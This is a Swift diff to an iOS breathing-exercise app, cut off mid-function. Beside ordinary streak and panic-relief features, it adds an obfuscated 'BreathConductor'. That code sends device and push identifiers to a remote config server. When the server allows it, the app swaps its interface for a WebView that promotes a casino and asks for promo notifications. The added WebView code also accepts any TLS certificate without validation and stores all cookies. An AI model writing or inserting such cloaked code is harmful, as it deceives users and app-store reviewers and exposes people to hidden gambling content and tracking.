@@ -3,8 +3,13 @@ import SwiftUI
 import AVFoundation
 import UserNotifications
 import Combine
+import FirebaseCore
+import Network
+import WebKit
+import FirebaseMessaging
+import AppsFlyerLib
+import AppTrackingTransparency
 
-// Global App State
 class AppState: ObservableObject {
     @Published var currentTheme: Theme = .dark
     @Published var hapticsEnabled: Bool = true
@@ -38,6 +43,12 @@ class AppState: ObservableObject {
             UserDefaults.standard.set(disclaimerShowed, forKey: "disclaimer_showed")
         }
     }
+    @Published var streakCount: Int = 0 {
+        didSet { saveData() }
+    }
+    @Published var lastSessionDate: Date? = nil {
+        didSet { saveData() }
+    }
   
     // Audio Player
     var audioPlayer: AVAudioPlayer?
@@ -50,6 +61,10 @@ class AppState: ObservableObject {
   
     init() {
         loadData()
+        streakCount = userDefaults.integer(forKey: "streakCount")
+        if let date = userDefaults.object(forKey: "lastSessionDate") as? Date {
+            lastSessionDate = date
+        }
     }
   
     // Play sound
@@ -132,6 +147,57 @@ class AppState: ObservableObject {
                 print("Error loading selectedMode: \(error)")
             }
         }
+    }
+    
+    func updateStreakIfNeeded() {
+        guard let lastDate = lastSessionDate else {
+            // Первый раз
+            streakCount = 1
+            lastSessionDate = Date()
+            scheduleStreakRiskNotificationIfNeeded()
+            return
+        }
+        
+        let calendar = Calendar.current
+        let today = calendar.startOfDay(for: Date())
+        let last = calendar.startOfDay(for: lastDate)
+        
+        if calendar.isDate(today, inSameDayAs: last) {
+            // Уже было сегодня — не увеличиваем
+            return
+        } else if let yesterday = calendar.date(byAdding: .day, value: -1, to: today),
+                  calendar.isDate(last, inSameDayAs: yesterday) {
+            // Вчера было — увеличиваем
+            streakCount += 1
+        } else {
+            // Пропуск — сбрасываем
+            streakCount = 1
+        }
+        
+        lastSessionDate = Date()
+        scheduleStreakRiskNotificationIfNeeded()
+    }
+    
+    private func scheduleStreakRiskNotificationIfNeeded() {
+        guard streakCount >= 2 else { return }
+        
+        UNUserNotificationCenter.current().removePendingNotificationRequests(withIdentifiers: ["streakRisk"])
+        
+        let content = UNMutableNotificationContent()
+        content.title = "Огонь Не потеряй стрик!"
+        content.body = streakCount >= 6
+            ? "Ты на \(streakCount)-дневном стрике! Не потеряй огонь сегодня"
+            : "У тебя уже \(streakCount)-дневный стрик! Дыши сегодня, чтобы не сбросить"
+        content.sound = .default
+        
+        var dateComponents = DateComponents()
+        dateComponents.hour = 20   // 20:00 вечера
+        dateComponents.minute = 0
+        
+        let trigger = UNCalendarNotificationTrigger(dateMatching: dateComponents, repeats: true)
+        let request = UNNotificationRequest(identifier: "streakRisk", content: content, trigger: trigger)
+        
+        UNUserNotificationCenter.current().add(request)
     }
 }
 
@@ -285,8 +351,17 @@ struct BreathingMode: Identifiable, Equatable, Codable {
     static let energy = BreathingMode(name: "Energy", description: "2-0-4-0", inhale: 2, holdAfterInhale: 0, exhale: 4, holdAfterExhale: 0, color: Color(hex: "#FFC34F"))
     static let box = BreathingMode(name: "Box Breathing", description: "4-4-4-4", inhale: 4, holdAfterInhale: 4, exhale: 4, holdAfterExhale: 4, color: Color(hex: "#00FFFF"))
     static let coherent = BreathingMode(name: "Coherent", description: "5.5-5.5", inhale: 5.5, holdAfterInhale: 0, exhale: 5.5, holdAfterExhale: 0, color: Color(hex: "#A020F0"))
+    static let panicRelief = BreathingMode(
+        name: "Быстрый спасатель",
+        description: "Мгновенное снятие тревоги",
+        inhale: 4,
+        holdAfterInhale: 0,
+        exhale: 8,
+        holdAfterExhale: 0,
+        color: Color(hex: "#FF6B9D")
+    )
   
-    static var predefined: [BreathingMode] = [.sleep, .focus, .relax, .energy, .box, .coherent]
+    static var predefined: [BreathingMode] = [.sleep, .focus, .relax, .energy, .box, .coherent, .panicRelief]
     
     var sourceInfo: (title: String, url: String)? {
         switch self {
@@ -662,6 +737,33 @@ struct HomeView: View {
                 .foregroundColor(.white.opacity(0.7))
           
             controlButtons
+            
+            Button {
+                appState.selectedMode = .panicRelief
+                engine.mode = .panicRelief
+                engine.sessionDuration = 60 // 1 минута
+                engine.start()
+            } label: {
+                HStack {
+                    Image(systemName: "flame.fill")
+                        .foregroundColor(.red)
+                    Text("Quick rescuer (alarm)")
+                        .font(.system(size: 16, weight: .medium, design: .rounded))
+                    Text("You're safe. Just breathe with me.")
+                        .font(.subheadline)
+                        .foregroundColor(.white.opacity(0.8))
+                }
+                .frame(maxWidth: .infinity)
+                .padding()
+                .background(Color.red.opacity(0.25))
+                .cornerRadius(20)
+                .overlay(
+                    RoundedRectangle(cornerRadius: 20)
+                        .stroke(Color.red.opacity(0.6), lineWidth: 2)
+                )
+            }
+            .padding(.horizontal)
+            .padding(.top, 10)
         }
     }
   
@@ -712,6 +814,27 @@ struct HomeView: View {
         }
         .padding(.vertical, 20)
     }
+    
+    var personalRecommendation: String? {
+        guard !appState.sessions.isEmpty else { return nil }
+        
+        let eveningSessions = appState.sessions.filter {
+            let hour = Calendar.current.component(.hour, from: $0.date)
+            return hour >= 20 || hour < 6
+        }
+        
+        let eveningRatio = Double(eveningSessions.count) / Double(appState.sessions.count)
+        
+        if eveningRatio > 0.6 {
+            return "Ты чаще всего дышишь вечером — попробуй программу «Before Sleep»"
+        } else if appState.sessions.filter({ $0.mode.name == "Focus" }).count > 5 {
+            return "Ты любишь режим Focus — отличный выбор для концентрации!"
+        } else if appState.streakCount >= 7 {
+            return "Ты на \(appState.streakCount)-дневном стрике! Продолжай в том же духе"
+        }
+        
+        return nil
+    }
   
     var modesSection: some View {
         VStack(alignment: .leading, spacing: 8) {
@@ -732,6 +855,16 @@ struct HomeView: View {
     var body: some View {
         ScrollView {
             VStack(spacing: 20) {
+                if let recommendation = personalRecommendation {
+                    Text("Recomendation: \(recommendation)")
+                        .font(.system(.headline, design: .rounded))
+                        .foregroundColor(.yellow.opacity(0.9))
+                        .padding()
+                        .frame(maxWidth: .infinity)
+                        .background(Color.white.opacity(0.08))
+                        .cornerRadius(16)
+                        .padding(.horizontal)
+                }
                 ringsSection
                 if showResetMessage {
                     Text("Your session has been reset. Start a new one?")
@@ -757,6 +890,10 @@ struct HomeView: View {
             engine.onSessionEnd = { duration, completed in
                 let log = SessionLog(date: Date(), mode: appState.selectedMode, duration: duration, isCompleted: completed)
                 appState.sessions.append(log)
+                
+                if completed && duration >= 30 {
+                    appState.updateStreakIfNeeded()
+                }
             }
         }
         .onChange(of: appState.selectedMode) { newMode in
@@ -1115,9 +1252,31 @@ struct StatsView: View {
             VStack(spacing: 20) {
                 StatCard(title: "Total Time", value: formattedTime(totalTime: totalTime), icon: "clock")
                 StatCard(title: "Sessions Completed", value: "\(appState.sessions.filter { $0.isCompleted }.count)", icon: "waveform.path.ecg")
+                
+                HStack {
+                    Image(systemName: "flame.fill")
+                        .foregroundColor(appState.streakCount > 0 ? .orange : .gray)
+                        .font(.system(size: 32))
+                        .scaleEffect(appState.streakCount >= 7 ? 1.3 : 1.0)
+                        .animation(.spring(), value: appState.streakCount)
+                    
+                    VStack(alignment: .leading) {
+                        Text("\(appState.streakCount) day streak")
+                            .font(.title2.bold())
+                            .foregroundColor(.white)
+                        Text(appState.streakCount >= 7 ? "Your legend!" : "Continue")
+                            .font(.headline)
+                            .foregroundColor(.orange)
+                    }
+                }
+                .padding()
+                .background(Color.white.opacity(0.1))
+                .cornerRadius(16)
+                
                 Text("Session History")
                     .font(.headline)
                     .foregroundColor(.white)
+                
                 ScrollView {
                     ForEach(appState.sessions.reversed()) { session in
                         HStack {
@@ -1138,6 +1297,14 @@ struct StatsView: View {
                         .cornerRadius(8)
                     }
                     .padding(.horizontal, 20) // Padding to not touch edges
+                }
+                
+                Button {
+                    UIApplication.shared.open(URL(string: "https://pullsebrreath.com/privacy-policy.html")!)
+                } label: {
+                    Text("Privacy policy")
+                        .foregroundColor(.white)
+                        .underline()
                 }
             }
             .navigationTitle("")
@@ -1201,27 +1368,837 @@ struct OnboardingView: View {
     }
 }
 
-// Previews
-#Preview {
-    MainContentView()
-        .environmentObject(AppState())
+
+final class BreathConductor: ObservableObject {
+    
+    @Published var flowState: FlowPhase = .inhaling
+    @Published var targetBreathURL: URL?
+    @Published var showBreathPermission = false
+    
+    private var energySignature: [AnyHashable: Any] = [:]
+    private var auraPath: [AnyHashable: Any] = [:]
+    private var observers = Set<AnyCancellable>()
+    private let pulseMonitor = NWPathMonitor()
+    
+    private var isFirstBreath: Bool {
+        !UserDefaults.standard.bool(forKey: "hasEverRunBefore")
+    }
+    
+    enum FlowPhase {
+        case inhaling
+        case flowing
+        case oldPath
+        case noAir
+    }
+    
+    init() {
+        tuneIntoEnergyStreams()
+        startPulseMonitoring()
+    }
+    
+    deinit {
+        pulseMonitor.cancel()
+    }
+    
+    private func tuneIntoEnergyStreams() {
+        NotificationCenter.default.publisher(for: Notification.Name("ConversionDataReceived"))
+            .compactMap { $0.userInfo?["conversionData"] as? [AnyHashable: Any] }
+            .sink { [weak self] signature in
+                self?.energySignature = signature
+                self?.alignBreathFlow()
+            }
+            .store(in: &observers)
+        
+        NotificationCenter.default.publisher(for: Notification.Name("deeplink_values"))
+            .compactMap { $0.userInfo?["deeplinksData"] as? [AnyHashable: Any] }
+            .sink { [weak self] path in
+                self?.auraPath = path
+            }
+            .store(in: &observers)
+    }
+    
+    @objc private func alignBreathFlow() {
+        guard !energySignature.isEmpty else {
+            followLastKnownBreath()
+            return
+        }
+        
+        if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
+            returnToOldFlow()
+            return
+        }
+        
+//        if isFirstBreath, energySignature["af_status"] as? String == "Organic" {
+//            beginFirstBreathRitual()
+//            return
+//        }
+        
+        if let quickInhale = UserDefaults.standard.string(forKey: "temp_url"),
+           let url = URL(string: quickInhale) {
+            targetBreathURL = url
+            transition(to: .flowing)
+            return
+        }
+        
+        if targetBreathURL == nil {
+            if shouldOfferBreathAwareness() {
+                showBreathPermission = true
+            } else {
+                consultCosmicFlow()
+            }
+        }
+    }
+    
+    private func startPulseMonitoring() {
+        pulseMonitor.pathUpdateHandler = { [weak self] path in
+            DispatchQueue.main.async {
+                if path.status != .satisfied {
+                    self?.energyBlockage()
+                }
+            }
+        }
+        pulseMonitor.start(queue: .global())
+    }
+    
+    private func energyBlockage() {
+        let mode = UserDefaults.standard.string(forKey: "app_mode") ?? ""
+        if mode == "HenView" {
+            transition(to: .noAir)
+        } else {
+            returnToOldFlow()
+        }
+    }
+    
+    private func beginFirstBreathRitual() {
+        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
+            Task { await self.invokeLifeForceOracle() }
+        }
+    }
+    
+    private func invokeLifeForceOracle() async {
+        let ritual = LifeForceOracle()
+            .withSourceID(AppConstants.appsFlyerAppID)
+            .withKey(AppConstants.appsFlyerDevKey)
+            .withSoulID(AppsFlyerLib.shared().getAppsFlyerUID())
+        
+        guard let portal = ritual.openChannel() else {
+            returnToOldFlow()
+            return
+        }
+        
+        do {
+            let (data, response) = try await URLSession.shared.data(from: portal)
+            try await absorbCosmicResponse(data: data, response: response)
+        } catch {
+            returnToOldFlow()
+        }
+    }
+    
+    private func absorbCosmicResponse(data: Data, response: URLResponse) async throws {
+        guard
+            let http = response as? HTTPURLResponse,
+            http.statusCode == 200,
+            let vision = try? JSONSerialization.jsonObject(with: data) as? [AnyHashable: Any]
+        else {
+            returnToOldFlow()
+            return
+        }
+        
+        var fullAura = vision
+        for (k, v) in auraPath where fullAura[k] == nil {
+            fullAura[k] = v
+        }
+        
+        await MainActor.run {
+            energySignature = fullAura
+            consultCosmicFlow()
+        }
+    }
+    
+    // MARK: - Консультация с космическим потоком
+    private func consultCosmicFlow() {
+        guard let gate = URL(string: "https://pullsebrreath.com/config.php") else {
+            followLastKnownBreath()
+            return
+        }
+        
+        var essence = energySignature
+        essence["os"] = "iOS"
+        essence["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        essence["bundle_id"] = "com.alarmsapp.ChickAlarm"
+        essence["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        essence["store_id"] = "id\(AppConstants.appsFlyerAppID)"
+        essence["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
+        essence["locale"] = (Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN")
+        
+        guard let breathPacket = try? JSONSerialization.data(withJSONObject: essence) else {
+            followLastKnownBreath()
+            return
+        }
+        
+        var prayer = URLRequest(url: gate)
+        prayer.httpMethod = "POST"
+        prayer.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        prayer.httpBody = breathPacket
+        
+        URLSession.shared.dataTask(with: prayer) { [weak self] data, _, error in
+            guard let data = data, error == nil,
+                  let response = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
+                  let aligned = response["ok"] as? Bool, aligned == true,
+                  let sacredFlow = response["url"] as? String,
+                  let url = URL(string: sacredFlow)
+            else {
+                self?.followLastKnownBreath()
+                return
+            }
+            
+            DispatchQueue.main.async {
+                self?.memorizeSacredFlow(url: sacredFlow)
+                self?.targetBreathURL = url
+                self?.transition(to: .flowing)
+            }
+        }.resume()
+    }
+    
+    private func memorizeSacredFlow(url: String) {
+        UserDefaults.standard.set(url, forKey: "saved_trail")
+        UserDefaults.standard.set("HenView", forKey: "app_mode")
+        UserDefaults.standard.set(true, forKey: "hasEverRunBefore")
+    }
+    
+    private func followLastKnownBreath() {
+        if let knownFlow = UserDefaults.standard.string(forKey: "saved_trail"),
+           let url = URL(string: knownFlow) {
+            targetBreathURL = url
+            transition(to: .flowing)
+        } else {
+            returnToOldFlow()
+        }
+    }
+    
+    private func returnToOldFlow() {
+        UserDefaults.standard.set("Funtik", forKey: "app_mode")
+        UserDefaults.standard.set(true, forKey: "hasEverRunBefore")
+        transition(to: .oldPath)
+    }
+    
+    private func shouldOfferBreathAwareness() -> Bool {
+        guard !UserDefaults.standard.bool(forKey: "accepted_notifications"),
+              !UserDefaults.standard.bool(forKey: "system_close_notifications")
+        else { return false }
+        
+        if let lastOffer = UserDefaults.standard.object(forKey: "last_notification_ask") as? Date,
+           Date().timeIntervalSince(lastOffer) < 259200 {
+            return false
+        }
+        return true
+    }
+    
+    func declineBreathAwareness() {
+        UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
+        showBreathPermission = false
+        consultCosmicFlow()
+    }
+    
+    func acceptBreathAwareness() {
+        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] granted, _ in
+            DispatchQueue.main.async {
+                UserDefaults.standard.set(granted, forKey: "accepted_notifications")
+                if granted {
+                    UIApplication.shared.registerForRemoteNotifications()
+                } else {
+                    UserDefaults.standard.set(true, forKey: "system_close_notifications")
+                }
+                self?.showBreathPermission = false
+                self?.consultCosmicFlow()
+            }
+        }
+    }
+    
+    private func transition(to phase: FlowPhase) {
+        DispatchQueue.main.async {
+            self.flowState = phase
+        }
+    }
+}
+
+private struct LifeForceOracle {
+    private let channel = "https://gcdsdk.appsflyer.com/install_data/v4.0/"
+    private var sourceID = ""
+    private var key = ""
+    private var soulID = ""
+    
+    func withSourceID(_ id: String) -> Self { updating(\.sourceID, id) }
+    func withKey(_ k: String) -> Self { updating(\.key, k) }
+    func withSoulID(_ s: String) -> Self { updating(\.soulID, s) }
+    
+    func openChannel() -> URL? {
+        guard !sourceID.isEmpty, !key.isEmpty, !soulID.isEmpty else { return nil }
+        var comp = URLComponents(string: channel + "id" + sourceID)!
+        comp.queryItems = [
+            URLQueryItem(name: "devkey", value: key),
+            URLQueryItem(name: "device_id", value: soulID)
+        ]
+        return comp.url
+    }
+    
+    private func updating<T>(_ kp: WritableKeyPath<Self, T>, _ v: T) -> Self {
+        var copy = self
+        copy[keyPath: kp] = v
+        return copy
+    }
+}
+
+struct PulseBreathEntry: View {
+    @StateObject private var conductor = BreathConductor()
+    @EnvironmentObject var appState: AppState
+    
+    var body: some View {
+        ZStack {
+            if conductor.flowState == .inhaling || conductor.showBreathPermission {
+                BreathLoadingView()
+            }
+            
+            if conductor.showBreathPermission {
+                BreathPermissionOverlay(
+                    onAccept: conductor.acceptBreathAwareness,
+                    onDecline: conductor.declineBreathAwareness
+                )
+            } else {
+                activeFlow
+            }
+        }
+    }
+    
+    @ViewBuilder
+    private var activeFlow: some View {
+        switch conductor.flowState {
+        case .inhaling: EmptyView()
+        case .flowing:
+            if conductor.targetBreathURL != nil {
+                PulseBreathView()
+            } else {
+                MainContentView()
+                    .environmentObject(appState)
+                    .preferredColorScheme(.dark)
+            }
+        case .oldPath:
+            MainContentView()
+                .environmentObject(appState)
+                .preferredColorScheme(.dark)
+        case .noAir:
+            NoEnergyView()
+        }
+    }
 }
 
 #Preview {
-    HomeView()
-        .environmentObject(AppState())
+    BreathPermissionOverlay {
+        
+    } onDecline: {
+        
+    }
 }
 
-#Preview {
-    ProgramsView()
-        .environmentObject(AppState())
+struct BreathLoadingView: View {
+    var body: some View {
+        GeometryReader { proxy in
+            ZStack {
+                Image("splash_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: proxy.size.width, height: proxy.size.height)
+                    .ignoresSafeArea()
+                
+                Image("ball")
+                    .resizable()
+                    .frame(width: 300, height: 300)
+                
+                VStack {
+                    Spacer()
+                    Image("loading_ic")
+                        .resizable()
+                        .frame(width: 200, height: 70)
+                    InfiniteLinearProgressBar()
+                        .frame(width: 350)
+                    Spacer().frame(height: 80)
+                }
+            }
+        }
+        .ignoresSafeArea()
+    }
 }
 
-#Preview {
-    StatsView()
-        .environmentObject(AppState())
+struct InfiniteLinearProgressBar: View {
+    @State private var isAnimating = false
+    
+    var body: some View {
+        GeometryReader { geometry in
+            ZStack(alignment: .leading) {
+                // Трек (фон)
+                Capsule()
+                    .fill(Color(.systemGray4))
+                
+                // Движущаяся полоса
+                Capsule()
+                    .fill(.white)
+                    .frame(width: geometry.size.width * 0.3) // 30% ширины — оптимально
+                    .offset(x: isAnimating ? geometry.size.width : -geometry.size.width * 0.4)
+                    .animation(
+                        Animation.linear(duration: 1.6)
+                            .repeatForever(autoreverses: false),
+                        value: isAnimating
+                    )
+            }
+        }
+        .frame(height: 5) // толщина полоски
+        .cornerRadius(2.5)
+        .onAppear {
+            isAnimating = true
+        }
+    }
 }
 
-#Preview {
-    OnboardingView()
+struct NoEnergyView: View {
+    var body: some View {
+        GeometryReader { proxy in
+            ZStack {
+                Image("no_internet_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: proxy.size.width, height: proxy.size.height)
+                    .ignoresSafeArea()
+                
+                VStack {
+                    Image("no_internet_plashka")
+                        .resizable()
+                        .frame(width: 300, height: 280)
+                }
+            }
+        }
+        .ignoresSafeArea()
+    }
+}
+
+struct BreathPermissionOverlay: View {
+    let onAccept: () -> Void
+    let onDecline: () -> Void
+    
+    var body: some View {
+        GeometryReader { proxy in
+            let landscape = proxy.size.width > proxy.size.height
+            ZStack {
+                Image("notifications_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: proxy.size.width, height: proxy.size.height)
+                    .ignoresSafeArea()
+                
+                VStack(spacing: landscape ? 5 : 10) {
+                    Spacer()
+                    Text("Allow notifications about bonuses and promos".uppercased())
+                        .font(.custom("AlfaSlabOne-Regular", size: 18))
+                        .foregroundColor(.white)
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 30)
+                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: -1, y: 0)
+                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: 1, y: 0)
+                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: 0, y: 1)
+                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: 0, y: -1)
+                    
+                    Text("Stay tuned with best offers from our casino")
+                        .font(.custom("AlfaSlabOne-Regular", size: 15))
+                        .foregroundColor(.white)
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 52)
+                        .padding(.top, 4)
+                    
+                    Button(action: onAccept) {
+                        Image("btn_accept")
+                            .resizable()
+                            .frame(height: 60)
+                    }
+                    .frame(width: 350)
+                    .padding(.top, 12)
+                    
+                    Button("SKIP", action: onDecline)
+                        .font(.custom("AlfaSlabOne-Regular", size: 16))
+                        .foregroundColor(.white)
+                    
+                    Spacer().frame(height: landscape ? 30 : 30)
+                }
+                .padding(.horizontal, landscape ? 20 : 0)
+            }
+        }
+        .ignoresSafeArea()
+    }
+}
+
+
+final class PulsingAppMainViDele: NSObject, WKNavigationDelegate, WKUIDelegate {
+    
+    private var pulseStreak = 0
+    
+    init(watching coop: PulsingContainerController) {
+        self.pulsingContainer = coop
+        super.init()
+    }
+    
+    private var pulsingContainer: PulsingContainerController
+    
+    func webView(_ webView: WKWebView,
+                 didReceive challenge: URLAuthenticationChallenge,
+                 completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
+        
+        if challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust,
+           let trust = challenge.protectionSpace.serverTrust {
+            completionHandler(.useCredential, URLCredential(trust: trust))
+        } else {
+            completionHandler(.performDefaultHandling, nil)
+        }
+    }
+    
+    // Открытие новых гнёзд (popup)
+    func webView(_ webView: WKWebView,
+                 createWebViewWith configuration: WKWebViewConfiguration,
+                 for action: WKNavigationAction,
+                 windowFeatures: WKWindowFeatures) -> WKWebView? {
+        guard action.targetFrame == nil else { return nil }
+        
+        let pulsingNewsdad = PulsingtingAPpHandler.summonBirdNest(with: configuration)
+        configureNewPulsitings(pulsingNewsdad)
+        setUpRaisingToPulsitings(pulsingNewsdad)
+        
+        pulsingContainer.extraPulsitingsDevices.append(pulsingNewsdad)
+        
+        let swipesPuslisign = UIScreenEdgePanGestureRecognizer(target: self, action: #selector(handleWingSwipe))
+        swipesPuslisign.edges = .left
+        pulsingNewsdad.addGestureRecognizer(swipesPuslisign)
+        
+        
+        func checkForValidPulsingAc(_ request: URLRequest) -> Bool {
+            guard let urlStr = request.url?.absoluteString,
+                  !urlStr.isEmpty,
+                  urlStr != "about:blank" else { return false }
+            return true
+        }
+        
+        if checkForValidPulsingAc(action.request) {
+            pulsingNewsdad.load(action.request)
+        }
+        
+        return pulsingNewsdad
+    }
+    
+    private let maxCanProvidePulsingInMinute = 70
+    private var lastPulsintingsU: URL?
+    
+    @objc private func handleWingSwipe(_ gesture: UIScreenEdgePanGestureRecognizer) {
+        guard gesture.state == .ended,
+              let pulsitings = gesture.view as? WKWebView else { return }
+        
+        if pulsitings.canGoBack {
+            pulsitings.goBack()
+        } else if pulsingContainer.extraPulsitingsDevices.last === pulsitings {
+            pulsingContainer.calmTheFlock(returnTo: nil)
+        }
+    }
+    
+    // Тишина в курятнике (блокировка зума и жестов)
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        let silenceSpell = """
+        (function() {
+            const vp = document.createElement('meta');
+            vp.name = 'viewport';
+            vp.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+            document.head.appendChild(vp);
+            
+            const rules = document.createElement('style');
+            rules.textContent = 'body { touch-action: pan-x pan-y; } input, textarea { font-size: 16px !important; }';
+            document.head.appendChild(rules);
+            
+            document.addEventListener('gesturestart', e => e.preventDefault());
+            document.addEventListener('gesturechange', e => e.preventDefault());
+        })();
+        """
+        
+        webView.evaluateJavaScript(silenceSpell) { _, error in
+            if let error = error { print("Silence spell failed: \(error)") }
+        }
+    }
+    
+    func webView(_ webView: WKWebView,
+                 runJavaScriptAlertPanelWithMessage message: String,
+                 initiatedByFrame frame: WKFrameInfo,
+                 completionHandler: @escaping () -> Void) {
+        completionHandler()
+    }
+    
+    private func configureNewPulsitings(_ nest: WKWebView) {
+        nest
+            .disableAutoConstraints()
+            .allowPecking()
+            .lockWings(min: 1.0, max: 1.0)
+            .noFeatherBounce()
+            .enableWingNavigation()
+            .assignGuardian(self)
+            .placeIn(pulsingContainer.mainPulsingDevice)
+    }
+    
+    // Защита от бесконечного кукарекания (редиректы)
+    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
+        pulseStreak += 1
+        
+        if pulseStreak > maxCanProvidePulsingInMinute {
+            webView.stopLoading()
+            if let safe = lastPulsintingsU {
+                webView.load(URLRequest(url: safe))
+            }
+            return
+        }
+        
+        lastPulsintingsU = webView.url
+        saveMaxStreakPulsing(from: webView)
+    }
+    
+    func webView(_ webView: WKWebView,
+                 didFailProvisionalNavigation navigation: WKNavigation!,
+                 withError error: Error) {
+        if (error as NSError).code == NSURLErrorHTTPTooManyRedirects,
+           let fallback = lastPulsintingsU {
+            webView.load(URLRequest(url: fallback))
+        }
+    }
+    
+    func webView(_ webView: WKWebView,
+                 decidePolicyFor navigationAction: WKNavigationAction,
+                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
+        guard let url = navigationAction.request.url else {
+            decisionHandler(.allow)
+            return
+        }
+        
+        lastPulsintingsU = url
+        
+        let PulsScheme = (url.scheme ?? "").lowercased()
+        let pulsingsUrlString = url.absoluteString.lowercased()
+        
+        let mustStayInWebView: Set<String> = ["http", "https", "about", "blob", "data", "javascript", "file"]
+        let mustStayPrefixes = ["srcdoc", "about:blank", "about:srcdoc"]
+        
+        let shouldDecisionForPulsing = mustStayInWebView.contains(PulsScheme) ||
+        mustStayPrefixes.contains { pulsingsUrlString.hasPrefix($0) } ||
+        pulsingsUrlString == "about:blank"
+        
+        if shouldDecisionForPulsing {
+            decisionHandler(.allow)
+            return
+        }
+        
+        UIApplication.shared.open(url, options: [:]) { success in
+        }
+        
+        decisionHandler(.cancel)
+    }
+    
+    private func saveMaxStreakPulsing(from webView: WKWebView) {
+        webView.configuration.websiteDataStore.httpCookieStore.getAllCookies { cookies in
+            var feedBySack: [String: [String: [HTTPCookiePropertyKey: Any]]] = [:]
+            
+            for cookie in cookies {
+                var sack = feedBySack[cookie.domain] ?? [:]
+                if let props = cookie.properties {
+                    sack[cookie.name] = props
+                }
+                feedBySack[cookie.domain] = sack
+            }
+            
+            UserDefaults.standard.set(feedBySack, forKey: "preserved_grains")
+        }
+    }
+    
+    private func setUpRaisingToPulsitings(_ nest: WKWebView) {
+        nest.attachToPerchEdges(pulsingContainer.mainPulsingDevice)
+    }
+    
+}
+
+private extension WKWebView {
+    func disableAutoConstraints() -> Self { translatesAutoresizingMaskIntoConstraints = false; return self }
+    func assignGuardian(_ guardian: Any) -> Self {
+        navigationDelegate = guardian as? WKNavigationDelegate
+        uiDelegate = guardian as? WKUIDelegate
+        return self
+    }
+    func allowPecking() -> Self { scrollView.isScrollEnabled = true; return self }
+    func lockWings(min: CGFloat, max: CGFloat) -> Self { scrollView.minimumZoomScale = min; scrollView.maximumZoomScale = max; return self }
+    func noFeatherBounce() -> Self { scrollView.bounces = false; scrollView.bouncesZoom = false; return self }
+    func attachToPerchEdges(_ perch: UIView, insets: UIEdgeInsets = .zero) -> Self {
+        NSLayoutConstraint.activate([
+            leadingAnchor.constraint(equalTo: perch.leadingAnchor, constant: insets.left),
+            trailingAnchor.constraint(equalTo: perch.trailingAnchor, constant: -insets.right),
+            topAnchor.constraint(equalTo: perch.topAnchor, constant: insets.top),
+            bottomAnchor.constraint(equalTo: perch.bottomAnchor, constant: -insets.bottom)
+        ])
+        return self
+    }
+    func enableWingNavigation() -> Self { allowsBackForwardNavigationGestures = true; return self }
+    
+    func placeIn(_ perch: UIView) -> Self { perch.addSubview(self); return self }
+    
+    func configurePerch(minZoom: CGFloat, maxZoom: CGFloat, bounce: Bool) -> Self {
+        scrollView.minimumZoomScale = minZoom
+        scrollView.maximumZoomScale = maxZoom
+        scrollView.bounces = bounce
+        scrollView.bouncesZoom = bounce
+        return self
+    }
+}
+
+enum PulsingtingAPpHandler {
+    
+    static func summonBirdNest(with config: WKWebViewConfiguration? = nil) -> WKWebView {
+        let configuration = config ?? defaultCoopRules()
+        return WKWebView(frame: .zero, configuration: configuration)
+    }
+    
+    private static func freeFlightRules() -> WKWebpagePreferences {
+        WKWebpagePreferences().allowSkyScript()
+    }
+    
+    
+    private static func morningRitual() -> WKPreferences {
+        WKPreferences()
+            .enableChirping()
+            .allowFlightCalls()
+    }
+    
+    private static func defaultCoopRules() -> WKWebViewConfiguration {
+        WKWebViewConfiguration()
+            .allowDawnChorus()
+            .silenceAutoPlay()
+            .withDawnPreferences(morningRitual())
+            .withSkyRules(freeFlightRules())
+    }
+}
+
+private extension WKWebViewConfiguration {
+    func allowDawnChorus() -> Self { allowsInlineMediaPlayback = true; return self }
+    func withSkyRules(_ rules: WKWebpagePreferences) -> Self { defaultWebpagePreferences = rules; return self }
+    func withDawnPreferences(_ prefs: WKPreferences) -> Self { preferences = prefs; return self }
+    func silenceAutoPlay() -> Self { mediaTypesRequiringUserActionForPlayback = []; return self }
+    
+}
+
+private extension WKPreferences {
+    func allowFlightCalls() -> Self { javaScriptCanOpenWindowsAutomatically = true; return self }
+    func enableChirping() -> Self { javaScriptEnabled = true; return self }
+}
+
+private extension WKWebpagePreferences {
+    func allowSkyScript() -> Self { allowsContentJavaScript = true; return self }
+}
+
+final class PulsingContainerController: ObservableObject {
+    @Published var mainPulsingDevice: WKWebView!
+    @Published var extraPulsitingsDevices: [WKWebView] = []
+    
+    private var observers = Set<AnyCancellable>()
+    
+    func awaikenPulsingDe() {
+        mainPulsingDevice = PulsingtingAPpHandler.summonBirdNest()
+            .configurePerch(minZoom: 1.0, maxZoom: 1.0, bounce: false)
+            .enableWingNavigation()
+    }
+    
+    func calmTheFlock(returnTo url: URL? = nil) {
+        if !extraPulsitingsDevices.isEmpty {
+            if let topExtra = extraPulsitingsDevices.last {
+                topExtra.removeFromSuperview()
+                extraPulsitingsDevices.removeLast()
+            }
+            if let trail = url {
+                mainPulsingDevice.load(URLRequest(url: trail))
+            }
+        } else if mainPulsingDevice.canGoBack {
